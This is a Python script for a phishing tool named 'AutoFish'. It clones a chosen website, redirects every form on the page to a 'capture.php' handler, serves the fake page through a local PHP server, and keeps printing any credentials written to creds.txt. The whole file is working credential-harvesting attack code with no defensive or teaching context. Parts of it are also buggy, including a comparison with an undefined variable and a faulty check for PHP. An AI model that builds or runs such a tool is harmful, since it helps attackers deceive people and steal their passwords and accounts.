#-*- coding: utf-8 -*-
from bs4 import BeautifulSoup
import requests
from time import sleep
from sys import stdout, exit
from os import system, path, listdir
import multiprocessing
def newtemplate(site):
    ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'
    try:
        r = requests.get(site, headers={'User-Agent': ua})
    except:
        return False
    s = BeautifulSoup(r.text, 'html.parser')
    for i in s.find_all('form'):
        i['action'] = 'capture.php'
    with open(p('WebPages/' + site), 'w') as f:
        f.write(s.prettify())
    return True
def p(rel):
    return path.join(path.dirname(path.realpath(__file__)), rel)
def connected(host='http://google.com'):
    try:
        requests.get(host)
        return
    except:
        exit('Cannot connect to network.')
def end():
    system('clear')
    exit('Stopped!')
def runPhishing(fn):
    system('rm -f {0} {1} && touch {0}'.format(p('Server/www/creds.txt'), p('Server/www/index.php')))
    system('cp ' + p('WebPages/' + fn) + ' ' + p('Server/www/index.php'))

def waitCreds():
    print('Waiting for credentials...\n')
    c = 0
    while True:
        with open(p('Server/www/creds.txt')) as creds:
            lines = creds.read()
        if len(lines) > c:
            print('[CREDENTIALS CAPTURED]:\n' + lines)
            c = len(lines)
        creds.close()
def runPEnv():
    system('clear')
    print('AutoFish starting...')
    print('Searching for PHP installation... ')
    if 256 != system('which php'):
        print('OK.')
    else:
        exit('PHP NOT FOUND! \nPlease install PHP and run AutoFish again.')
    templates = listdir(p('WebPages'))
    if '.gitignore' in templates:
        templates.remove('.gitignore')
        system('rm -f ' + p('WebPages/.gitignore'))
    for idx, i in enumerate(templates):
        print('[' + str(idx) + '] ' + i)
    print("[n] create new")
    a = input('Choose template: ')
    if a == n:
        if newtemplate(input("Webpage to copy with http(s): ")):
            exit("Created")
        else:
            exit("Can't connect")
    template = templates[int(a)]
    runPhishing(template)
def runServer():
    system('cd ' + p('Server/www/') + ' && php -S 127.0.0.1:8080')

if __name__ == '__main__':
    try:
        runPEnv()
        multiprocessing.Process(target=runServer).start()
        waitCreds()
    except KeyboardInterrupt:
        end()